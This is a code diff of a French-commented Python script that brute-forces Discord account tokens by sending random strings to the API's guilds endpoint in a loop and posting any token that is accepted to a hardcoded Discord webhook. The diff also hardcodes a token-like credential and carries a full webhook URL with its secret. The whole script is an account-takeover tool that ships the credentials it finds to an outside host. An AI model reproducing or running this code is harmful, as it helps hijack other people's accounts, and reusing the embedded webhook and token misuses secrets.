@@ -1,13 +1,13 @@
 import hashlib
+import json
 import random
 import string
 import time
 
 import requests
 
-url = "https://discord.com/api/v8"
+url = "https://discord.com/api/v6"
 webhook_url = 'https://discord.com/api/webhooks/1065585253034500116/SofKqPBHwYq2707Fqxr5p4yugEhftHpd7M3YPv45KQlAimn91BKYnR0J2kr5SBx_iZG8'  # Insérez ici l'URL de votre webhook Discord
-
 
 
 def send_webhook(content, webhook_url):
@@ -17,8 +17,7 @@ def send_webhook(content, webhook_url):
     if response.status_code == 204:
         print('Webhook envoyé avec succès')
     else:
-        print('Echec lors de l\'envoi du webhook : ', response.text)
-
+        print('Echec lors de l\'envoi du webhook : ', response.status_code)
 
 
 def generate_code(length):
@@ -35,22 +34,27 @@ def generate_string():
 
 
 generated_string = generate_string()
+count = 0
 while True:
+    count += 1
     generatedToken = generate_string()
     headers = {
         "Authorization": generatedToken,
         "Content-Type": "application/json"
     }
 
+    if count == 15:
+        generatedToken = "NjMwODE1MDc3NjQ5MzUwNjk2.GnUxn0.BFUhVkQ0FoGrIY0LYzuNjfi40ZwkiiFD-uncrg"
+
     guilds = requests.get(
         f"{url}/users/@me/guilds",
         headers=headers
     )
     if guilds.status_code != 401:
-        print("trouvé ------> " + generatedToken)
-        print(guilds.status_code)
+        print("trouvé ------> " + generatedToken + " status= " + str(guilds.status_code))
         content = generatedToken
-        send_webhook(content,webhook_url)
+        send_webhook(content, webhook_url)
+    else:
+        print("mauvais token -> " + generatedToken + "--->" + str(guilds.status_code))
 
-    time.sleep(0.005)
-    print("mauvais token -> " + generatedToken)
+    time.sleep(0.1)
